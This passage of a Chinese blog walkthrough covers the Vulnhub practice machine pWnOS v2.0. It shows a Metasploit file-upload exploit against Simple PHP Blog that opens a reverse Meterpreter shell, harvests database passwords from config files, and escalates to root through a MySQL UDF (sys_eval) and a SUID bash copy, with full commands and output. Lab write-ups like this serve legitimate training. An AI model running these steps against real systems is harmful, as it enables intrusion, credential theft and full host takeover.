class=\"hljs-operator\">></span> <span class=\"hljs-operator\">/</span>blog<span class=\"hljs-operator\">/</span>\nmsf6 exploit(unix<span class=\"hljs-operator\">/</span>webapp<span class=\"hljs-operator\">/</span>sphpblog_file_upload) <span class=\"hljs-operator\">></span> exploit <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>启动攻击\n\n[<span class=\"hljs-operator\">*</span>] Started reverse TCP handler <span class=\"hljs-keyword\">on</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>:<span class=\"hljs-number\">4444</span> \n[<span class=\"hljs-operator\">+</span>] Successfully retrieved hash: $<span class=\"hljs-number\">1</span>$weWj5iAZ$NU4CkeZ9jNtcP<span class=\"hljs-operator\">/</span>qrPC69a<span class=\"hljs-operator\">/</span>\n[<span class=\"hljs-operator\">+</span>] Successfully removed <span class=\"hljs-operator\">/</span>config<span class=\"hljs-operator\">/</span>password.txt\n[<span class=\"hljs-operator\">+</span>] Successfully created temporary account.\n[<span class=\"hljs-operator\">+</span>] Successfully logged <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">as</span> OTmoxq:ykM0Fg\n[<span class=\"hljs-operator\">+</span>] Successfully retrieved cookie: ii9ppvao0fveedft2314so41u3\n[<span class=\"hljs-operator\">+</span>] Successfully uploaded pVmL1BgOJLbmlN8mucTA.php\n[<span class=\"hljs-operator\">+</span>] Successfully uploaded gy904amvE6YvJp3W7xkC.php\n[<span class=\"hljs-operator\">+</span>] Successfully reset original password hash.\n[<span class=\"hljs-operator\">+</span>] Successfully removed <span class=\"hljs-operator\">/</span>images<span class=\"hljs-operator\">/</span>pVmL1BgOJLbmlN8mucTA.php\n[<span class=\"hljs-operator\">*</span>] Calling payload: <span class=\"hljs-operator\">/</span>images<span class=\"hljs-operator\">/</span>gy904amvE6YvJp3W7xkC.php\n[<span class=\"hljs-operator\">*</span>] Sending stage (<span class=\"hljs-number\">39927</span> bytes) <span class=\"hljs-keyword\">to</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.150</span>\n[<span class=\"hljs-operator\">*</span>] Meterpreter session <span class=\"hljs-number\">1</span> opened (<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>:<span class=\"hljs-number\">4444</span> <span class=\"hljs-operator\">-</span><span class=\"hljs-operator\">></span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.150</span>:<span class=\"hljs-number\">42500</span>) <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">2024</span><span class=\"hljs-number\">-09</span><span class=\"hljs-number\">-24</span> <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">01</span>:<span class=\"hljs-number\">33</span> <span class=\"hljs-operator\">+</span><span class=\"hljs-number\">0800</span>\n[<span class=\"hljs-operator\">+</span>] Successfully removed <span class=\"hljs-operator\">/</span>images<span class=\"hljs-operator\">/</span>gy904amvE6YvJp3W7xkC.php\nmeterpreter <span class=\"hljs-operator\">></span> \n</code></pre>\n<p>攻击成功，输入<code>shell</code>以获得靶机<code>shell</code></p>\n<pre><code class=\"hljs language-sql\">meterpreter <span class=\"hljs-operator\">></span> shell\nProcess <span class=\"hljs-number\">1680</span> created.\nChannel <span class=\"hljs-number\">0</span> created.\nsh: getcwd() failed: <span class=\"hljs-keyword\">No</span> such file <span class=\"hljs-keyword\">or</span> directory\nsh: getcwd() failed: <span class=\"hljs-keyword\">No</span> such file <span class=\"hljs-keyword\">or</span> directory\n\npython <span class=\"hljs-operator\">-</span>c \"import pty;pty.spawn('/bin/bash')\" <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>获得交互性更好的shell\nshell<span class=\"hljs-operator\">-</span>init: error retrieving <span class=\"hljs-keyword\">current</span> directory: getcwd: cannot access parent directories: <span class=\"hljs-keyword\">No</span> such file <span class=\"hljs-keyword\">or</span> directory\nwww<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@web</span>:$ \n</code></pre>\n<p>获得<code>www-data</code>的<code>shell</code></p>\n</li>\n</ul>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-sql\">www<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@web</span>:$ whoami\nwww<span class=\"hljs-operator\">-</span>data\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nwww<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@web</span>:$ uname <span class=\"hljs-operator\">-</span>a\nLinux web <span class=\"hljs-number\">2.6</span><span class=\"hljs-number\">.38</span><span class=\"hljs-number\">-8</span><span class=\"hljs-operator\">-</span>server #<span class=\"hljs-number\">42</span><span class=\"hljs-operator\">-</span>Ubuntu SMP Mon Apr <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">03</span>:<span class=\"hljs-number\">49</span>:<span class=\"hljs-number\">04</span> UTC <span class=\"hljs-number\">2011</span> x86_64 x86_64 x86_64 GNU<span class=\"hljs-operator\">/</span>Linux\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nwww<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@web</span>:$ ip a\n<span class=\"hljs-number\">1</span>: lo: <span class=\"hljs-operator\">&#x3C;</span>LOOPBACK,UP,LOWER_UP<span class=\"hljs-operator\">></span> mtu <span class=\"hljs-number\">16436</span> qdisc noqueue state <span class=\"hljs-literal\">UNKNOWN</span> \n    link<span class=\"hljs-operator\">/</span>loopback <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span> brd <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>\n    inet <span class=\"hljs-number\">127.0</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">.1</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">8</span> <span class=\"hljs-keyword\">scope</span> host lo\n    inet6 ::<span class=\"hljs-number\">1</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">128</span> <span class=\"hljs-keyword\">scope</span> host \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-number\">2</span>: eth0: <span class=\"hljs-operator\">&#x3C;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class=\"hljs-operator\">></span> mtu <span class=\"hljs-number\">1500</span> qdisc pfifo_fast state UP qlen <span class=\"hljs-number\">1000</span>\n    link<span class=\"hljs-operator\">/</span>ether <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>c:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">5</span>d:<span class=\"hljs-number\">85</span>:<span class=\"hljs-number\">45</span> brd ff:ff:ff:ff:ff:ff\n    inet <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.150</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">24</span> brd <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.255</span> <span class=\"hljs-keyword\">scope</span> <span class=\"hljs-keyword\">global</span> eth0\n    inet6 fe80::<span class=\"hljs-number\">20</span>c:<span class=\"hljs-number\">29</span>ff:fe5d:<span class=\"hljs-number\">8545</span><span class=\"hljs-operator\">/</span><span class=\"hljs-number\">64</span> <span class=\"hljs-keyword\">scope</span> link \n       valid_lft forever preferred_lft forever\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nwww<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@web</span>:$ id\nuid<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">33</span>(www<span class=\"hljs-operator\">-</span>data) gid<span class=\"hljs-operator\">=</span><span class=\"hljs-number\">33</span>(www<span class=\"hljs-operator\">-</span>data) <span class=\"hljs-keyword\">groups</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">33</span>(www<span class=\"hljs-operator\">-</span>data)\n</code></pre>\n</li>\n<li>\n<p>信息收集</p>\n<ul>\n<li>\n<p>获取数据库连接配置文件，获得数据库用户<code>root</code>，密码<code>goodday</code></p>\n<pre><code class=\"hljs language-sql\">www<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@web</span>:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>www$ cat mysqli_connect.php \n<span class=\"hljs-operator\">&#x3C;</span>?php # Script <span class=\"hljs-number\">8.2</span> <span class=\"hljs-operator\">-</span> mysqli_connect.php\n\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> This file <span class=\"hljs-keyword\">contains</span> the database access information.\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> This file also establishes a connection <span class=\"hljs-keyword\">to</span> MySQL\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> <span class=\"hljs-keyword\">and</span> selects the database.\n\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> <span class=\"hljs-keyword\">Set</span> the database access information <span class=\"hljs-keyword\">as</span> constants:\n\n<span class=\"hljs-keyword\">DEFINE</span> (<span class=\"hljs-string\">'DB_USER'</span>, <span class=\"hljs-string\">'root'</span>);\n<span class=\"hljs-keyword\">DEFINE</span> (<span class=\"hljs-string\">'DB_PASSWORD'</span>, <span class=\"hljs-string\">'goodday'</span>);\n<span class=\"hljs-keyword\">DEFINE</span> (<span class=\"hljs-string\">'DB_HOST'</span>, <span class=\"hljs-string\">'localhost'</span>);\n<span class=\"hljs-keyword\">DEFINE</span> (<span class=\"hljs-string\">'DB_NAME'</span>, <span class=\"hljs-string\">'ch16'</span>);\n\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> Make the connection:\n\n$dbc <span class=\"hljs-operator\">=</span> <span class=\"hljs-variable\">@mysqli_connect</span> (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) <span class=\"hljs-keyword\">OR</span> die (<span class=\"hljs-string\">'Could not connect to MySQL: '</span> . mysqli_connect_error() );\n</code></pre>\n</li>\n<li>\n<p>尝试登录，登陆失败，继续寻找mysql连接配置文件</p>\n<p>根据上面发现的连接配置的文件来寻找</p>\n<pre><code class=\"hljs language-sql\">www<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@web</span>:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>www$ find <span class=\"hljs-operator\">/</span> <span class=\"hljs-operator\">-</span>name <span class=\"hljs-string\">'*mysqli_connect*'</span> <span class=\"hljs-number\">2</span><span class=\"hljs-operator\">></span><span class=\"hljs-operator\">/</span>dev<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">null</span>\n<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>mysqli_connect.php\n<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>www<span class=\"hljs-operator\">/</span>mysqli_connect.php\n</code></pre>\n<pre><code class=\"hljs language-sql\">www<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@web</span>:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>www$ cat <span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>mysqli_connect.php \n<span class=\"hljs-operator\">&#x3C;</span>?php # Script <span class=\"hljs-number\">8.2</span> <span class=\"hljs-operator\">-</span> mysqli_connect.php\n\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> This file <span class=\"hljs-keyword\">contains</span> the database access information.\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> This file also establishes a connection <span class=\"hljs-keyword\">to</span> MySQL\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> <span class=\"hljs-keyword\">and</span> selects the database.\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> <span class=\"hljs-keyword\">Set</span> the database access information <span class=\"hljs-keyword\">as</span> constants:\n\n<span class=\"hljs-keyword\">DEFINE</span> (<span class=\"hljs-string\">'DB_USER'</span>, <span class=\"hljs-string\">'root'</span>);\n<span class=\"hljs-keyword\">DEFINE</span> (<span class=\"hljs-string\">'DB_PASSWORD'</span>, <span class=\"hljs-string\">'root@ISIntS'</span>);\n<span class=\"hljs-keyword\">DEFINE</span> (<span class=\"hljs-string\">'DB_HOST'</span>, <span class=\"hljs-string\">'localhost'</span>);\n<span class=\"hljs-keyword\">DEFINE</span> (<span class=\"hljs-string\">'DB_NAME'</span>, <span class=\"hljs-string\">'ch16'</span>);\n\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> Make the connection:\n$dbc <span class=\"hljs-operator\">=</span> <span class=\"hljs-variable\">@mysqli_connect</span> (DB_HOST, DB_USER, DB_PASSWORD, DB_NAME) <span class=\"hljs-keyword\">OR</span> die (<span class=\"hljs-string\">'Could not connect to MySQL: '</span> . mysqli_connect_error() );\n?<span class=\"hljs-operator\">></span>\n</code></pre>\n<p>获得密码<code>root@ISIntS</code> ，尝试登陆成功</p>\n</li>\n<li>\n<p>查询数据，发现一个用户<code>Dan</code> ，尝试<code>ssh</code>登录</p>\n<pre><code class=\"hljs language-sql\">mysql<span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">from</span> users;\n<span class=\"hljs-keyword\">select</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">from</span> users;\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">---------+------------+-----------+------------------+------------------------------------------+------------+----------------------------------+---------------------+</span>\n<span class=\"hljs-operator\">|</span> user_id <span class=\"hljs-operator\">|</span> first_name <span class=\"hljs-operator\">|</span> last_name <span class=\"hljs-operator\">|</span> email            <span class=\"hljs-operator\">|</span> pass                                     <span class=\"hljs-operator\">|</span> user_level <span class=\"hljs-operator\">|</span> active                           <span class=\"hljs-operator\">|</span> registration_date   <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">---------+------------+-----------+------------------+------------------------------------------+------------+----------------------------------+---------------------+</span>\n<span class=\"hljs-operator\">|</span>       <span class=\"hljs-number\">1</span> <span class=\"hljs-operator\">|</span> Dan        <span class=\"hljs-operator\">|</span> Privett   <span class=\"hljs-operator\">|</span> admin<span class=\"hljs-variable\">@isints</span>.com <span class=\"hljs-operator\">|</span> c2c4b4e51d9e23c02c15702c136c3e950ba9a4af <span class=\"hljs-operator\">|</span>          <span class=\"hljs-number\">0</span> <span class=\"hljs-operator\">|</span> <span class=\"hljs-keyword\">NULL</span>                             <span class=\"hljs-operator\">|</span> <span class=\"hljs-number\">2011</span><span class=\"hljs-number\">-05</span><span class=\"hljs-number\">-07</span> <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">27</span>:<span class=\"hljs-number\">01</span> <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">---------+------------+-----------+------------------+------------------------------------------+------------+----------------------------------+---------------------+</span>\n<span class=\"hljs-number\">2</span> <span class=\"hljs-keyword\">rows</span> <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">set</span> (<span class=\"hljs-number\">0.00</span> sec)\n</code></pre>\n</li>\n<li>\n<p>破译密码得：<code>killerbeesareflying</code> ，ssh尝试登陆失败，密码是错的</p>\n</li>\n<li>\n<p>因为我们有数据库root权限，所以可以尝试UDF提权</p>\n<p>查看<code>secure_priv</code>权限 ，符合要求</p>\n<pre><code class=\"hljs language-sql\">mysql<span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">SHOW</span> VARIABLES <span class=\"hljs-keyword\">LIKE</span> \"secure_file_priv\";\n<span class=\"hljs-keyword\">SHOW</span> VARIABLES <span class=\"hljs-keyword\">LIKE</span> \"secure_file_priv\";\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">------------------+-------+</span>\n<span class=\"hljs-operator\">|</span> Variable_name    <span class=\"hljs-operator\">|</span> <span class=\"hljs-keyword\">Value</span> <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">------------------+-------+</span>\n<span class=\"hljs-operator\">|</span> secure_file_priv <span class=\"hljs-operator\">|</span>       <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">------------------+-------+</span>\n</code></pre>\n<p>查看plugin路径，存放在 <code>/usr/lib/mysql/plugin</code></p>\n<pre><code class=\"hljs language-sql\">mysql<span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">show</span> variables <span class=\"hljs-keyword\">like</span> <span class=\"hljs-string\">'%plugin%'</span>;                \n<span class=\"hljs-keyword\">show</span> variables <span class=\"hljs-keyword\">like</span> <span class=\"hljs-string\">'%plugin%'</span>;\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">---------------+-----------------------+</span>\n<span class=\"hljs-operator\">|</span> Variable_name <span class=\"hljs-operator\">|</span> <span class=\"hljs-keyword\">Value</span>                 <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">---------------+-----------------------+</span>\n<span class=\"hljs-operator\">|</span> plugin_dir    <span class=\"hljs-operator\">|</span> <span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>mysql<span class=\"hljs-operator\">/</span>plugin <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">---------------+-----------------------+</span>\n</code></pre>\n<p>动态链接库存放在kali 的<code>/usr/share/metasploit-framework/data/exploits/mysql</code> 下，将动态链接库文件传到靶机的<code>/tmp</code>文件夹</p>\n<pre><code class=\"hljs language-sql\">cd <span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>share<span class=\"hljs-operator\">/</span>metasploit<span class=\"hljs-operator\">-</span>framework<span class=\"hljs-operator\">/</span>data<span class=\"hljs-operator\">/</span>exploits<span class=\"hljs-operator\">/</span>mysql\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 选择版本传到靶机\nlib_mysqludf_sys_32.dll  \nlib_mysqludf_sys_64.dll\nlib_mysqludf_sys_32.so   \nlib_mysqludf_sys_64.so\n</code></pre>\n<p>将动态链接库传入到plugin路径</p>\n<pre><code class=\"hljs language-sql\">mysql<span class=\"hljs-operator\">></span> use mysql;\n\nmysql<span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">create table</span> foo(line <span class=\"hljs-type\">blob</span>);\nQuery OK, <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">rows</span> affected (<span class=\"hljs-number\">0.00</span> sec)\n\nmysql<span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">insert into</span> foo <span class=\"hljs-keyword\">values</span> (load_file(<span class=\"hljs-string\">'/tmp/lib_mysqludf_sys_64.so'</span>))\nQuery OK, <span class=\"hljs-number\">1</span> <span class=\"hljs-type\">row</span> affected (<span class=\"hljs-number\">0.00</span> sec)\n\nmysql<span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">from</span> foo <span class=\"hljs-keyword\">into</span> dumpfile <span class=\"hljs-string\">'/usr/lib/mysql/plugin/udf.so'</span>;\nQuery OK, <span class=\"hljs-number\">1</span> <span class=\"hljs-type\">row</span> affected (<span class=\"hljs-number\">0.00</span> sec)\n\nmysql<span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">create</span> <span class=\"hljs-keyword\">function</span> sys_eval <span class=\"hljs-keyword\">returns</span> string soname <span class=\"hljs-string\">'udf.so'</span>;\nQuery OK, <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">rows</span> affected (<span class=\"hljs-number\">0.00</span> sec)\n\nmysql<span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">select</span> <span class=\"hljs-operator\">*</span> <span class=\"hljs-keyword\">from</span> mysql.func; \n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">----------+-----+--------+----------+</span>\n<span class=\"hljs-operator\">|</span> name     <span class=\"hljs-operator\">|</span> ret <span class=\"hljs-operator\">|</span> dl     <span class=\"hljs-operator\">|</span> type     <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">----------+-----+--------+----------+</span>\n<span class=\"hljs-operator\">|</span> sys_eval <span class=\"hljs-operator\">|</span>   <span class=\"hljs-number\">2</span> <span class=\"hljs-operator\">|</span> udf.so <span class=\"hljs-operator\">|</span> <span class=\"hljs-keyword\">function</span> <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">----------+-----+--------+----------+</span>\n\nmysql<span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">select</span> sys_eval(<span class=\"hljs-string\">'whoami'</span>); <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 函数存在root函数\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">--------------------+</span>\n<span class=\"hljs-operator\">|</span> sys_eval(<span class=\"hljs-string\">'whoami'</span>) <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">--------------------+</span>\n<span class=\"hljs-operator\">|</span> root               <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">--------------------+</span>\n</code></pre>\n</li>\n</ul>\n</li>\n<li>\n<p>提权</p>\n<ul>\n<li>\n<p>创建用户自定义函数后，函数获得root权限，通过函数来获得<code>root</code>的<code>shell</code></p>\n<pre><code class=\"hljs language-sql\">mysql<span class=\"hljs-operator\">></span> <span class=\"hljs-keyword\">select</span> sys_eval(<span class=\"hljs-string\">'cp /bin/bash /tmp/binbash; chmod +xs /tmp/binbash'</span>);\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">---------------------------------------------------------------+</span>\n<span class=\"hljs-operator\">|</span> sys_eval(<span class=\"hljs-string\">'cp /bin/bash /tmp/binbash; chmod +xs /tmp/binbash'</span>) <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">---------------------------------------------------------------+</span>\n<span class=\"hljs-operator\">|</span> <span class=\"hljs-keyword\">NULL</span>                                                          <span class=\"hljs-operator\">|</span>\n<span class=\"hljs-operator\">+</span><span class=\"hljs-comment\">---------------------------------------------------------------+</span>\n</code></pre>\n<ul>\n<li><code>cp /bin/bash /tmp/binbash</code>：将 <code>/bin/bash</code> 文件复制到 <code>/tmp</code> 目录，并命名为 <code>binbash</code>。</li>\n<li><code>chmod +xs /tmp/binbash</code>：给复制的文件 <code>binbash</code> 设置 SUID 位，这样当用户执行该文件时，进程将以文件拥有者（通常是 root）的权限运行。</li>\n</ul>\n</li>\n<li>\n<p>获得shell</p>\n<pre><code class=\"hljs language-sql\">www<span class=\"hljs-operator\">-</span>data<span class=\"hljs-variable\">@web</span>:<span class=\"hljs-operator\">/</span>tmp$ <span class=\"hljs-operator\">/</span>tmp<span class=\"hljs-operator\">/</span>binbash <span class=\"hljs-operator\">-</span>p\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nbinbash<span class=\"hljs-number\">-4.2</span># whoam\nroot\n</code></pre>\n</li>\n</ul>\n</li>\n</ol>\n<h2>思路</h2>\n<p>因为获得了数据库密码，并且是root用户，查看配置适合使用UDF</p>","title":"Vulnhub - pWnOS v2 0","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"pWnOS v2.0\n\n \n \n\n主机发现端口扫描\n\n1. 探测存活主机，`150`为靶机\n    \n    \n    \n2. 扫描主机所有端口\n    \n    \n    \n3. 扫描服务版本及系统版本\n    \n    \n    \n4. 扫描漏洞\n    \n    \n    \n    难得发现疑似`csrf` ，但在靶机上用处好像不大，还发现了一些可能感兴趣的路径\n    \n\nweb渗透\n\n1..."},"recentPosts":[{"id":"CyberstrikelabLab2","title":"Cyberstrikelab - Lab2","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"CyberstrikelabLab-1","title":"Cyberstrikelab - Lab1","date":"2025-08-12","isEncrypted":false,"year":"2025","month":"08","day":"12"},{"id":"HackTheBoxSeason8 - Cobblestone","title":"HackTheBox - Season8 - Cobblestone","date":"2025-08-11","isEncrypted":true,"year":"2025","month":"08","day":"11"},{"id":"TheHackersLabsShadowGate","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"HackTheBoxSeason7-Code","title":"HackTheBox - Machine - Code","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"TheHackersLabsOfusPingu","title":"TheHackersLabs - OfusPingu","date":"2025-08-05","isEncrypted":false,"year":"2025","month":"08","day":"05"},{"id":"TheHackersLabsDoraemon","title":"TheHackersLabs - Doraemon","date":"2025-08-03","isEncrypted":false,"year":"2025","month":"08","day":"03"}]},"__N_SSG":true}